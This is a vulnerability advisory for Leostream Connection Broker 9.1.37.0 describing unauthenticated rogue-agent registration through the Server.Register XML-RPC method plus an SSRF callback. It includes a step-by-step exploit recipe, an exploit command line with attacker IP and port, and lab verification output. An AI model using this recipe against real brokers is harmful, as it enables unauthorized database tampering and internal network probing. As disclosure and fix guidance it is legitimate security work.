# Leostream Connection Broker 9.1.37.0 — Unauthenticated Server.Register Rogue-Agent Registration + SSRF

## 1. Overview

Leostream Connection Broker is a closed-source VDI connection broker. Its `/rpc.pl` endpoint exposes a Frontier::RPC2 XML-RPC service whose methods are dispatched via `RPC_Server.pm::methods`. Most methods are wrapped with `api_setup_session`, which enforces an authenticated session. `Server.Register` is dispatched **without** that wrapper, and its token parameter (`TOKEN61B240DC3E5B`) is checked only when present (`if exists $args->{'TOKEN...'}`) — so a request that simply omits the token bypasses authentication entirely.

The result is two unauthenticated primitives: (1) rogue VM/agent records inserted into the broker database with attacker-controlled fields, and (2) an SSRF primitive — the broker's `check_status` background job opens an outbound TLS connection to `https://<attacker-controlled ip>:<port>/RPC2` for the registered VM. Both were verified on a default 9.1.37.0 installation with no configuration changes.

## 2. Vulnerability Summary

- **Type**: Unauthenticated rogue-agent registration + server-side request forgery (SSRF)
- **Root cause 1 (CWE-306)**: `Server.Register` dispatch lacks the `api_setup_session` gate
- **Root cause 2 (CWE-287)**: the token check is optional — `if exists $args->{'TOKEN61B240DC3E5B'}` skips all validation when the parameter is absent
- **Root cause 3 (CWE-918)**: the `check_status` background job connects outbound to the attacker-controlled `ip:hda_port` registered for the VM
- **Result**: anonymous attacker injects rogue VM records and directs broker outbound TLS connections. Not RCE; default install, no config dependency.

## 3. Authentication Boundary

The XML-RPC dispatch table in `RPC_Server.pm` (L253+) wraps authenticated methods:

```perl
'Server.Register', sub { return 'Server'->register(@_); }   # NO api_setup_session wrapper = unauthenticated
```

`Server.Register` directly calls `Server->register` for any caller. A total of 26 methods are unauthenticated (Server.*/DS/Login/ThinWin.*); this advisory focuses on `Server.Register`.

Inside `Server.pm::register`, the token gate is:

```perl
# L2484
if exists $args->{'TOKEN61B240DC3E5B'} {
    ... token validation ...
}
```

Omitting the token skips the whole block — no credentials, no token, no session are required.

## 4. Attack Surface

- **Entry**: `POST /rpc.pl` XML-RPC `Server.Register` method call, no token
- **Controllable fields**: `AGENT_UUID`, `AGENT_INSTANCE_UUID` (hex), `HOST_NAME`, `MAC_LIST` (comma-separated string), `IP_LIST` (comma-separated string), `RPC_PORT` (0-65535)
- **Gate condition**: `REASON=AGENT_START` bypasses the "no matching VM" early return
- **Sink 1**: `Vm->new('-new',1)->save_data($d)` — DB insert into the `vm` table
- **Sink 2**: `check_status` job — outbound `https://<vm_ip>:<vm_port>/RPC2` connection

## 5. Sink Identification

**DB-write sink** (`Server.pm::register`, L3127-3128):

```perl
Vm->new('-new',1)->save_data($d);
```

`$d` contains attacker-controlled `agent_uuid`, `agent_instance_uuid`, `ip`, `hostname`, `mac`, and `hda_port` from request parameters.

**Outbound-connection sink** (audit-log evidence from the `check_status` job):

```
"Contacting \"https://<vm_ip>:<vm_port>/RPC2\", function \"Agent.Connect\""
```

The broker initiates the outbound TLS connection to the IP/port stored in the rogue VM record.

## 6. Source Identification & Controllability

Frontier::RPC2 parses request parameters into `$args`. Key sources:

| Parameter | Handling | Controllability |
|---|---|---|
| `AGENT_UUID` | `make_valid_computer_uuid` (L2456, strips non-hex, 32 chars) | ✅ attacker-controlled |
| `AGENT_INSTANCE_UUID` | `make_valid_computer_uuid` (L2457) | ✅ attacker-controlled |
| `HOST_NAME` | `alltrim` (L2475, max 255) | ✅ attacker-controlled |
| `MAC_LIST` | `split(/\s*,\s*/, alltrim(...))` (L2627, string split) | ✅ attacker-controlled |
| `IP_LIST` | string split | ✅ attacker-controlled |
| `RPC_PORT` | `min(max(...,0),65535)` (L2470) | ✅ attacker-controlled |
| `TOKEN61B240DC3E5B` | optional (L2484 `if exists`) | omitted → no validation |

`MAC_LIST` must be sent as a **comma-separated string**, not an XML-RPC array: `alltrim` on an arrayref returns empty, producing an empty `@mac_list` and undefined `$backup_mac`, which triggers the early return at L2783 (`@$raw_vms==0 and not $backup_mac`).

## 7. Data Flow

```
Unauthenticated POST /rpc.pl (no TOKEN)
  → Frontier::RPC2 parse → Server->register($args)
  → L2484: if exists TOKEN → skipped (token absent)
  → L2456-2457: agent_uuid / agent_instance_uuid = attacker hex
  → L2627: MAC_LIST split into @mac_list, $backup_mac
  → L2783: @$raw_vms==0 and not $backup_mac → return (MAC must be valid string)
  → L2792: reason != 'AGENT_START' → return (REASON=AGENT_START passes)
  → L2862-2864: $desktop_ip = REMOTE_ADDR (attacker IP)
  → L3067-3084: 20s port-check loop to $desktop_ip:$agent_port
  → L3127-3128: Vm->new('-new',1)->save_data($d) → rogue VM row inserted
  → [async] check_status job queue → https://<vm_ip>:<vm_port>/RPC2 Agent.Connect
```

## 8. Exploit Construction

### 8.1 Unauthenticated rogue VM registration

Build a Frontier::RPC2 `<methodCall>` **without TOKEN**:

- `REASON=AGENT_START` — enters the new-VM registration path
- `AGENT_UUID` / `AGENT_INSTANCE_UUID` — 32-char hex
- `HOST_NAME` — valid hostname (alphanumeric + hyphen)
- `MAC_LIST` — comma-separated string such as `00:11:22:33:44:55` (NOT an XML-RPC array)
- `IP_LIST` — comma-separated string
- `RPC_PORT` — the SSRF target port

### 8.2 SSRF callback

Set `RPC_PORT` to an attacker-listening port. After the VM record is created, the broker's `check_status` job (≈30 s polling) connects to `https://<attacker-ip>:<attacker-port>/RPC2` with function `Agent.Connect` — the outbound TLS connection (SSRF).

### 8.3 MAC_LIST pitfall

The first exploit attempt sent `MAC_LIST` as an XML-RPC `<array>`; `alltrim` on an arrayref returned empty, so no VM was created. Error log: `Use of uninitialized value $_ in pattern match at Server.pm line 2562`, response time 0.128 s (port-check loop not entered). Switching to a `<string>` comma-separated value made the response take 19.9 s (20 s port-check loop entered) and the VM record was created.

## 9. Dynamic Verification

Environment: Leostream Broker 9.1.37.0 in a centos:7 container; target `https://127.0.0.1:443/rpc.pl`; listener on `127.0.0.1:8888`.

Unauthenticated registration (no token):

```
python3 02-exploit.py https://127.0.0.1:443/rpc.pl register \
  --host-name vuln002-final-verify --mac 00:11:22:33:44:AA \
  --attacker-ip 127.0.0.1 --attacker-port 8888
```

Response: `ERROR=0` (accepted, unauthenticated).

Rogue VM record confirmed in the database:

```sql
SELECT id,hostname,ip,mac,agent_instance_uuid FROM vm WHERE hostname LIKE '%vuln002-final%';
--  6 | vuln002-final-verify | 127.0.0.1 | 00:11:22:33:44:AA | ABF2A6D2D063E12DA55CE46A07062D91
```

SSRF callback captured by the listener:

```
[listener] CONNECTION from 127.0.0.1:41868
[listener] received 135 bytes:
hex: 1603010082... (TLS ClientHello, first byte 0x16)
```

Audit log (`log` table, `check_status` job):

```
"Contacting \"https://127.0.0.1:8888/RPC2\", function \"Agent.Connect\""
"Call failed, error 1500: 500 Can't connect to 127.0.0.1:8888 (SSL connect attempt failed...)"
```

The broker's outbound TLS connection to the attacker-controlled port matches the captured TLS ClientHello — SSRF dynamically verified.

## 10. Reachability & Impact

- **Reachability**: `Server.Register` is open to any unauthenticated caller by default; no configuration flag is required (unlike `enable_unauth_login`/`allow_rogue` gates). The outbound SSRF fires via the `check_status` polling job (~30 s).
- **Impact**: rogue VM records corrupt the broker's inventory and can interfere with session brokering; the outbound TLS primitive lets an attacker probe internal HTTPS services or interact with internal endpoints using the broker as a pivot.
- **Limitations**: the outbound connection is TLS (not plaintext HTTP) and triggered on a ~30 s polling cycle, not immediately.

## 11. Fix Recommendations

1. Make token validation mandatory — remove the `if exists` condition, or wrap `Server.Register` with `api_setup_session`.
2. Strictly validate `MAC_LIST`/`IP_LIST` types and formats.
3. Add SSRF defense in `check_status`: filter RFC1918/loopback/link-local targets and restrict outbound destinations.
4. Route unauthenticated registrations through an approval queue instead of directly creating VM records.

## 12. CWE & CVSS

- **CWE-306**: Missing Authentication for Critical Function (`Server.Register` without `api_setup_session`)
- **CWE-287**: Improper Authentication (optional token check)
- **CWE-918**: Server-Side Request Forgery (outbound TLS via `check_status`)
- **CVSS**: 7.0 — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N (approximate)
